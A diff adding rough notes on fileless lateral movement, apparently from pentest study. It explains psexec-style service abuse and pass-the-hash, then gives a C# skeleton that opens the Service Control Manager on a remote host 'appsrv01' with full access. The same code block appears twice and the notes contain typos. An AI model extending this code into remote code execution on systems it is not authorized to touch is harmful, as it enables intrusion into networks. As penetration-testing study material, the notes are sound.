@@ -342,6 +342,59 @@ psexec authenticates to SMB on the target host and accesses the DCE/RPC interfac
 
 The binary tha is executed by the service is copied to the target host
 
+we will wrrite an attack without writing it to disk
+
+code must authenticate to the target host
+and then we should execute the desired code
+
+its easy to pass the hash as well using this
+
+# implementing fileless later movement in C#
+
+```
+using System;
+using System.Runtime.InteropServices;
+namespace lat
+{
+ class Program
+ {
+ [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
+CharSet=CharSet.Unicode, SetLastError=true)]
+ public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
+uint dwAccess);
+ static void Main(string[] args)
+ {
+ String target = "appsrv01";
+ 
+ IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
+ } 
+ }
+}
+```
+
+### using System;
+using System.Runtime.InteropServices;
+namespace lat
+{
+ class Program
+ {
+ [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
+CharSet=CharSet.Unicode, SetLastError=true)]
+ public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
+uint dwAccess);
+ static void Main(string[] args)
+ {
+ String target = "appsrv01";
+ 
+ IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
+ } 
+ }
+}
+
+
+
+
+
 
 
 
